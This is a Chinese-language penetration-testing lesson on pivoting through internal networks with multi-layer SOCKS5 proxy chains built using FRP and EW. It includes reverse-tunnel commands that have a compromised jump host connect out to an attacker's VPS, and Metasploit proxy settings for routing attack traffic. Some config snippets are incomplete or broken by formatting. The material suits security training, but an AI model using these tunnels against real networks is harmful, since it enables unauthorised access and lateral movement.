一层代理是最简单的情况，我们的攻击机可以直接通过一个跳板机访问其所在的内网网段。

**流量走向分析：**
1.  攻击者配置浏览器或工具，使用代理设置（如 `127.0.0.1:10090`）。
2.  流量被发送到VPS（公网服务器）上FRP服务端监听的端口（如 `10090`）。
3.  VPS上的FRP服务端通过已建立的代理通道，将流量转发给内网跳板机（Target 1）上的FRP客户端。
4.  跳板机（Target 1）收到请求后，通过自己的网卡访问同网段的目标（如 `192.168.2.2` 的Web服务）。
5.  响应数据沿原路径返回。

![](img/1119a18b0fabc5258500e18c9289f70f_85.png)

![](img/1119a18b0fabc5258500e18c9289f70f_87.png)

![](img/1119a18b0fabc5258500e18c9289f70f_89.png)

**核心命令示例：**
在VPS上启动FRP服务端，监听端口等待连接。
在跳板机（Target 1）上启动FRP客户端，连接VPS并建立Socks5代理。
```bash
# VPS (frps.ini)
[common]
bind_port = 7000
```

### 二层Socks代理

![](img/1119a18b0fabc5258500e18c9289f70f_116.png)

![](img/1119a18b0fabc5258500e18c9289f70f_118.png)

当目标处于更深层的网络（例如，需要先访问 `192.168.2.2`，再由它访问 `192.168.33.33`）时，就需要二层代理。

**流量走向分析：**
1.  攻击者流量到达VPS的 `10090` 端口（第一层代理入口）。
2.  VPS将流量通过第一层通道转发给跳板机Target 1。
3.  Target 1 上需要配置**流量转发规则**，将到达的代理流量（例如来自本地 `10090` 端口的流量）再次转发。
4.  这次转发目标是Target 1与Target 2之间建立的**第二个代理通道**（例如 `10089` 端口）。
5.  流量通过第二个通道到达Target 2。
6.  Target 2 作为新的跳板，通过自己的网卡访问最终目标 `192.168.33.33`。
7.  响应数据沿原路径返回。

![](img/1119a18b0fabc5258500e18c9289f70f_120.png)

![](img/1119a18b0fabc5258500e18c9289f70f_121.png)

![](img/1119a18b0fabc5258500e18c9289f70f_123.png)

**核心配置概念：**
这需要在Target 1上运行第二个FRP服务端，在Target 2上运行FRP客户端，建立它们之间的通道。然后在Target 1上设置规则，将第一层代理的流量导入这个新通道。
```bash
# Target 1 上启动第二个frps，监听端口 7001
# Target 2 (frpc.ini) 连接 Target 1
[common]
server_addr = 192.168.2.1 # Target 1的IP
server_port = 7001

![](img/1119a18b0fabc5258500e18c9289f70f_125.png)

![](img/1119a18b0fabc5258500e18c9289f70f_127.png)

![](img/1119a18b0fabc5258500e18c9289f70f_129.png)

![](img/1119a18b0fabc5258500e18c9289f70f_131.png)

[socks5]
type = tcp
remote_port = 10089 # 在Target 1上监听的Socks5端口
plugin = socks5
```
接着，在攻击工具（如MSF）中设置全局代理或模块代理，指向第一层代理入口 `your_vps_ip:10090`，即可实现对 `192.168.33.33` 的访问。

![](img/1119a18b0fabc5258500e18c9289f70f_133.png)

![](img/1119a18b0fabc5258500e18c9289f70f_135.png)

![](img/1119a18b0fabc5258500e18c9289f70f_137.png)

**以下是操作验证步骤：**
1.  使用 `nmap` 或 `ProxyChains` 通过代理扫描 `192.168.33.33` 的端口，确认代理生效。
2.  在Metasploit中，使用 `setg Proxies socks5:your_vps_ip:10090` 命令设置全局代理，之后发起的攻击流量都会经过此代理链。

以下是EW的几个核心参数：
*   `-s`：设置运行模式。
*   `-l`：指定本地监听的端口。
*   `-d`：指定反弹代理的目标IP（用于反向连接）。
*   `-e`：指定反弹代理的目标端口。
*   `-f`：指定要连接的目标IP（用于正向连接）。
*   `-g`：指定要连接的目标端口。

EW主要有6种工作模式，本节课会用到其中几种：
*   `ssocksd`：正向Socks5代理服务器。
*   `rcsocks`：反向Socks5流量转发（接收端）。
*   `rssocks`：反向Socks5代理服务器（启动端）。

### 正向Socks5代理

在能直接访问的跳板机上启动一个Socks5服务，攻击机直接连接。
```bash
# 在跳板机上执行
./ew -s ssocksd -l 1080
```
执行后，该机器就在1080端口开启了Socks5代理。攻击机可直接设置代理为 `跳板机IP:1080` 来访问其所在内网。

### 反向Socks5代理

![](img/1119a18b0fabc5258500e18c9289f70f_189.png)

![](img/1119a18b0fabc5258500e18c9289f70f_191.png)

当跳板机不能直接被攻击机访问（但有出网权限）时，使用反向代理。跳板机主动连接到攻击者控制的VPS，在VPS上形成一个代理入口。

![](img/1119a18b0fabc5258500e18c9289f70f_193.png)

![](img/1119a18b0fabc5258500e18c9289f70f_194.png)

![](img/1119a18b0fabc5258500e18c9289f70f_196.png)

![](img/1119a18b0fabc5258500e18c9289f70f_198.png)

![](img/1119a18b0fabc5258500e18c9289f70f_200.png)

![](img/1119a18b0fabc5258500e18c9289f70f_202.png)

![](img/1119a18b0fabc5258500e18c9289f70f_204.png)

![](img/1119a18b0fabc5258500e18c9289f70f_205.png)

**以下是建立反向代理的步骤：**
1.  **在VPS（攻击端）上启动流量接收端：**
    ```bash
    ./ew -s rcsocks -l 1080 -e 8888
    ```
    此命令在VPS上监听1080端口，并等待8888端口的连接。1080是最终的Socks5代理入口。
2.  **在内网跳板机（Target）上启动反向代理服务端：**
    ```bash
    ./ew -s rssocks -d your_vps_ip -e 8888
    ```
    此命令让跳板机主动连接到VPS的8888端口。连接成功后，通过VPS的1080端口发出的流量就会被转发到该跳板机。

### 多层穿透实践

![](img/1119a18b0fabc5258500e18c9289f70f_213.png)

结合一层和二层代理的原理，使用EW实现访问 `192.168.33.33`。

![](img/1119a18b0fabc5258500e18c9289f70f_219.png)

![](img/1119a18b0fabc5258500e18c9289f70f_221.png)

![](img/1119a18b0fabc5258500e18c9289f70f_222.png)

![](img/1119a18b0fabc5258500e18c9289f70f_224.png)

![](img/1119a18b0fabc5258500e18c9289f70f_226.png)

**操作流程：**
1.  **第一层反向代理（访问 `192.168.2.0/24`）：**
    *   VPS执行：`./ew -s rcsocks -l 10088 -e 8888`
    *   Target 1执行：`./ew -s rssocks -d your_vps_ip -e 8888`
    *   此时，设置代理为 `your_vps_ip:10088` 可访问Target 1所在网段。
2.  **第二层流量转发与正向代理（访问 `192.168.33.0/24`）：**
    *   在Target 1上执行流量转发，将VPS来的流量转到Target 2：
        ```bash
        ./ew -s lcx_slave -d 192.168.2.2 -e 9999 -f your_vps_ip -g 8888
        ```
        *   含义：连接VPS(`your_vps_ip:8888`)和Target 2(`192.168.2.2:9999`)，打通通道。
    *   在Target 2上启动一个正向Socks5代理：
        ```bash
        ./ew -s ssocksd -l 9999
        ```
        *   在9999端口开启代理。
3.  **最终效果：** 攻击机设置代理为 `your_vps_ip:10088`，发出的请求会经过 `VPS -> Target 1 -> Target 2` 这条链，最终由Target 2访问 `192.168.33.33`。

对于三层或更多层网络，原理相同，只需在每一层跳板机上依次使用 `lcx_slave` 进行流量转发，并在最后一台跳板机上启动 `ssocksd` 即可。

## 总结与注意事项

本节课中我们一起学习了Socks代理在内网穿透中的应用。
1.  **核心原理**：通过在多台跳板机之间建立连续的代理或流量转发通道，实现攻击流量的逐层深入。
2.  **工具使用**：我们掌握了FRP和EW两个工具的基本命令，用于建立正向、反向及多层的Socks5代理。
3.  **关键点**：理解数据流的走向是配置成功的关键。务必清楚每一层代理的入口IP和端口，以及流量被转发到了哪里。
4.  **排错提示**：操作时请细心检查命令参数（IP、端口）、网络连通性以及进程是否正常运行。大多数错误信息会直接提示问题所在（如端口冲突、连接失败）。

![](img/1119a18b0fabc5258500e18c9289f70f_242.png)

通过本课的学习，你应该能够根据目标网络结构，灵活运用代理工具搭建穿透链路，为后续的内网横向移动和信息收集奠定基础。
